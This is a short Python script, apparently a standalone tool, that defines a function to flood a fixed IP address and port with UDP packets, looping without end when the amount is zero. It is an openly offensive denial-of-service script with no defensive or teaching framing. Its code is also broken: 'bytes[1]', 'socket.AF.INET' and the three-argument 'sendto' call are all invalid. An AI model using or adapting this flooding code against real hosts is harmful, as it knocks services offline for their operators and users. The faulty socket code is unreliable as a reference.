"""
UDP Flooding to fixed IP and Port
"""

import socket

# Message is 1 byte
MESSAGE = bytes[1]


def udp_flood(ip, port, amount):
    sock = socket.socket(socket.AF.INET,  # Internet
                         socket.SOCK_DGRAM)  # UDP

    if amount == 0:
        while True:
            sock.sendto(MESSAGE, ip, port)
    else:
        for i in range(0, amount):
            sock.sendto(MESSAGE, ip, port)
